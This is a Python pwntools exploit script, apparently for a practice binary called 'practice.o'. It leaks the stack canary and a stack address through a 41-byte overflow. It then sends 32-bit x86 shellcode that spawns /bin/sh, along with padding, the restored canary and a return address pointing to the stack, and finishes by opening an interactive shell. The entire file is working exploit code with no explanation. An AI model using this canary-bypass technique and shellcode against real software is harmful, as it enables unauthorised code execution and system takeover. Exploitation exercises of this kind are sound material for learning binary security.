from pwn import *

r = process('practice.o')

r.send(b'a'*41)

r.recvuntil(b'a'*41)
canary = r.recvuntil(b'\n')[0:3]
canary = u32(b'\x00'+canary)

stack = r.recvuntil(b'\n')[:-1]
stack = int(stack, 16)

print(hex(canary))
print(hex(stack))

shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"
ex = shellcode + b'a'*(40-len(shellcode))
ex += p32(canary)
ex += b'a'*4
ex += p32(stack)

r.send(ex)

r.interactive()

















